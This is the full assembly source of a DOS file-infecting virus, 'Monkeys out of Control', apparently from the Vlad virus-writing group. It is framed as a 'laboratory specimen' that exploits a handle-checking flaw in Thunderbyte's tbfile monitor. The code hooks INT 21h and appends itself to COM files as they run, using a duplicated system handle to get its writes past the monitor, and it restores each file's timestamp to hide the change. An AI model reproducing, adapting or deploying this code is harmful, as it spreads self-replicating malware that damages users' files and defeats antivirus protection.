
; Monkeys out of Control, a laboratory specimen by Rhincewind [Vlad]
;
; The purpose of this virus is to show that Thunderbyte's tbfile will
; allow writes to file handles that are normally characterbased 
; 'system' handles, set to CON:. Instead of checking if the handle points 
; to a character device, tbfile makes it's judgement based on the handle
; number only. Tsss..
;
; To exploit this flaw, all you have to do is open your target file 
; for read/write and copy the returned file handle to one of the system 
; handles using function 46h.
                
                .model tiny

                .code

                org 100h

start:
                dec bp
                mov si, offset endvirus-2
                mov cx, (endvirus-start)/2
                std
pushloop:                
                lodsw 
                push ax
                loop pushloop           
                push sp
                pop ax
                add ax,(stack_entry-start)
                push ax
                cli
                ret
stack_entry:
                dec sp
                dec sp
                pop bp
                sti
no_int1:
                cld
                mov word ptr [bp+(jmpseg-stack_entry)],cs
                mov si,offset restore-100h    
                org $-2
restore_offset  dw ?
                mov di, 100h
                add si,di
                mov cx, (endvirus-start)
                rep movsb
                push cx
                lea si, [bp-(stack_entry-start)]
                mov di, 200h
                mov es, word ptr [si-2]
                mov cx, (endvirus-start)
                rep movsb
                mov ds,cx
                mov ax, offset seg0_entry+100h
                push ax
                mov ax,0eaf9h
                push ax
                jmp sp
                db 'Monkeys out of Control'
seg0_entry:
                jc dont_hang    
                jmp $
dont_hang:
                mov di, 84h
                les bx, dword ptr es:[di]
                cmp byte ptr ds:[di+2],20h
                jz exit
                mov word ptr ds:[di+(int21offset+100h-84h)],bx
                mov word ptr ds:[di+(int21seg+100h-84h)],es
                mov word ptr ds:[di+2],20h
                mov word ptr ds:[di], offset int21-100h
exit:
                mov ax, [jmpseg+100h]
                mov ds,ax
                mov es,ax
                mov sp,0fffch
                xor ax,ax
                xor bx,bx
                cwd
                xor bp,bp
                xor si,si
                xor di,di
                db 0eah
jmpoffset       dw 100h
jmpseg          dw 0
int21:
                cmp ax, 4b00h
                jnz jmporg21
                push ax
                push bx
                push cx
                push dx
                push ds
                push es
                mov ah, 48h
                mov bx, (((endvirus-start)+15)/16)
                int 21h
                jc abort_before_mem
                push ax
                push ax
                mov ax,3d02h
                int 21h
                xchg ax,dx
                pop ds
                jc free_mem_abort
                mov ah, 45h
                xor bx,bx
                int 21h
                push ax
                mov ah, 46h
                mov bx,dx
                xor cx,cx
                int 21h
                push ax
                mov ah, 3eh
                int 21h
                pop bx
                mov ah, 3fh
                call cx_len_dx_zero
                cmp byte ptr ds:[bx],'M'
                jz file_abort
                mov ax, 4202h
                mov cx,bx
                int 21h
                mov cs:restore_offset-100h,ax
                mov ax, 5700h
                push ax
                int 21h
                push cx
                push dx
                call write
                mov ax, 4200h
                mov cx,bx
                int 21h
                push cs
                pop ds
                call write
                pop dx
                pop cx
                pop ax
                inc ax
                int 21h
file_abort:
                mov ah, 46h
                pop bx
                xor cx,cx
                int 21h
                mov ah,3eh
                int 21h
free_mem_abort:
                pop es
                mov ah, 49h
                int 21h
abort_before_mem:                
                pop es
                pop ds
                pop dx
                pop cx
                pop bx
                pop ax
jmporg21:                
                jmp dword ptr cs:int21offset-100h
write:
                mov ah,40h
cx_len_dx_zero:                
                cwd
                mov cx, (endvirus-start)
int21_ret:                
                int 21h
                ret
align word
endvirus:
restore:
int21offset     dw 20cdh
int21seg        dw ?

                end start


